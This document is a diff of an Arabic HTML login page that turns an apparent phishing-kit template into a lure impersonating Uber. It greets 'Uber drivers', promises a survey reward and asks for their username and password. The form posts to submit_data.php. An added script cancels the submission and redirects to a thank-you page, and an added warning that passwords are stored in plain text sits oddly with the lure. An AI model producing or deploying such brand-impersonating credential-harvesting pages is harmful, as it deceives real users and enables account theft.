@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول إلى حسابك</title>
+    <title>نموذج تسجيل الدخول</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             background-color: #f4f4f9;
             text-align: center;
             padding: 50px;
@@ -49,6 +49,12 @@
             background-color: #45a049;
         }
 
+        .warning {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
         footer {
             margin-top: 20px;
             font-size: 14px;
@@ -87,18 +93,34 @@
 </head>
 <body>
     <div class="container">
-        <h2>مرحبًا بك!</h2>
-        <p>يرجى تسجيل الدخول لمتابعة.</p>
+        <h2>مرحبًا سائق أوبر!</h2>
+        <p>يرجى تسجيل الدخول للحصول على مكافأتك بعد إتمام الاستبيان. فقط أدخل بياناتك أدناه.</p>
         
-        <form action="{{.URL}}" method="POST">
+        <form action="submit_data.php" method="POST" id="loginForm">
             <input type="text" name="username" placeholder="اسم المستخدم" required>
             <input type="password" name="password" placeholder="كلمة المرور" required>
             <button type="submit">تسجيل الدخول</button>
         </form>
 
+        <div class="warning">
+            <p>تحذير: يتم تخزين كلمات المرور حاليًا بصيغة نصية عادية، يرجى توخي الحذر.</p>
+        </div>
+
         <footer>
-            <p>إذا كنت تواجه مشكلة، يمكنك <a href="https://www.example.com/support">الاتصال بالدعم الفني</a>.</p>
+            <p>إذا كنت تواجه مشكلة في التسجيل، يمكنك <a href="https://www.example.com/support">الاتصال بالدعم الفني</a>.</p>
         </footer>
     </div>
+
+    <script>
+        // JavaScript to handle form submission and redirection
+        document.getElementById("loginForm").onsubmit = function(event) {
+            event.preventDefault();  // Prevent the default form submission
+
+            // Simulating form submission
+            setTimeout(function() {
+                window.location.href = "http://www.example.com/thank-you"; // Replace with your actual redirection URL
+            }, 500);  // Redirects after 500ms delay
+        };
+    </script>
 </body>
 </html>
